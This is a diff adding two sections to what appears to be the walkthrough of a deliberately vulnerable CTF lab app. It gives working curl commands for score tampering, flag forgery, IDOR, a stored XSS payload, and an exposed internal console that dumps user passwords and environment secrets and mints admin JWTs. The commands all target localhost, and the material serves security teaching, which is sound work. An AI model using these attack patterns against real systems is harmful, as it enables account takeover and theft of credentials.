@@ -645,3 +645,76 @@ curl -s localhost:4060/api/black-team/crown -H "authorization: Bearer <forged-ad
 - `GET /api/debug/eval` — looks like RCE; gated behind `LJ_DEBUG` (off by design). **Expected: abstain.**
 - `GET /api/internal/rotate-keys` — needs a per-boot nonce that is never exposed. **Expected: abstain.**
 A PoC that claims either "works" is a false positive — the moat werbos is being trained to hold.
+
+---
+
+# v12 — Hack the Scoreboard (the instrument is a target)
+
+Fronted by the **hacker terminal** (press `` ` `` on the storefront). The CTF scoreboard is
+self-reported and trusts the client — so it's hackable five ways. The punchline is `score verify`:
+the server has been quietly recording which flags it *actually emitted* to each player, so an
+honest recompute exposes any forgery. **Lesson: trust the server-verified capture, not the claim.**
+
+### S1. Score tampering · `POST /api/score/set`
+```bash
+curl -s localhost:4060/api/score/set -H 'content-type: application/json' -d '{"player":"h4x","score":9999}'   # FLAG{lj_scoreboard_score_tamper}
+```
+
+### S2. Flag forgery · `POST /api/score/claim`
+Claim a flag you never earned — no proof required:
+```bash
+curl -s localhost:4060/api/score/claim -H 'content-type: application/json' -d '{"player":"h4x","flag":"FLAG{lj_black_team}"}'   # FLAG{lj_scoreboard_flag_forgery}
+```
+
+### S3. IDOR — overwrite another player · `POST /api/score/set` (`X-Player` ≠ body player)
+```bash
+curl -s localhost:4060/api/score/set -H 'content-type: application/json' -H 'x-player: attacker' -d '{"player":"victim","score":1}'   # FLAG{lj_scoreboard_idor_overwrite}
+```
+
+### S4. Stored XSS in the leaderboard · player name → `GET /leaderboard`
+```bash
+curl -s localhost:4060/api/score/claim -H 'content-type: application/json' -d '{"player":"h4x","name":"<img src=x onerror=alert(1)>"}'
+curl -s localhost:4060/leaderboard   # name rendered raw → FLAG{lj_scoreboard_stored_xss}
+```
+
+### S5. The punchline — fraudulent 100%, caught by verify · `GET /api/score/verify?player=`
+```bash
+# after tampering your score >= total:
+curl -s "localhost:4060/api/score/verify?player=h4x"
+# "claimed 9999, verified 3. 9996 forged." → FLAG{lj_scoreboard_pwned}
+```
+
+## The hacker terminal
+`public/hack.js` — backtick-toggle console styled after the CryptoBlocks kids' terminal.
+Every line is a real HTTP result. Commands: `scan · curl · login · ask · chain · werbos · hint · sink ·
+flags · progress · score · theme · fortune · cowsay`. The `werbos <path>` command demos the
+honest-abstain loop on screen (GREEN cite+verify, or ABSTAIN).
+
+---
+
+# v13 — JuicyOps, the internal console (left exposed)
+
+The ops team's internal shell, reachable from the public site (one dir over from the leaked
+JuicySec reports). No real auth. **Deterministic — nothing executes on the host** (the classic
+command-injection sink was deliberately swapped for staff-impersonation).
+
+### I1. Console exposed · `GET /internal/console`
+Reachable unauthenticated — security by obscurity only. `FLAG{lj_internal_console_exposed}`.
+
+### I2. Arbitrary SQL runner · `POST /api/internal/exec {cmd:"sql"}`
+```bash
+curl -s localhost:4060/api/internal/exec -H 'content-type: application/json' \
+  -d '{"cmd":"sql","arg":"SELECT email,password FROM users"}'   # FLAG{lj_internal_sql_console}
+```
+
+### I3. Secrets dump · `POST /api/internal/exec {cmd:"env"}`
+```bash
+curl -s localhost:4060/api/internal/exec -H 'content-type: application/json' -d '{"cmd":"env"}'   # FLAG{lj_internal_env_dump}
+```
+
+### I4. Staff impersonation · `POST /api/internal/exec {cmd:"su"}`
+Mint a session as ANY user — instant privilege escalation:
+```bash
+curl -s localhost:4060/api/internal/exec -H 'content-type: application/json' \
+  -d '{"cmd":"su","arg":"admin@leakyjuice.com"}'   # returns an admin JWT → FLAG{lj_internal_impersonation}
+```
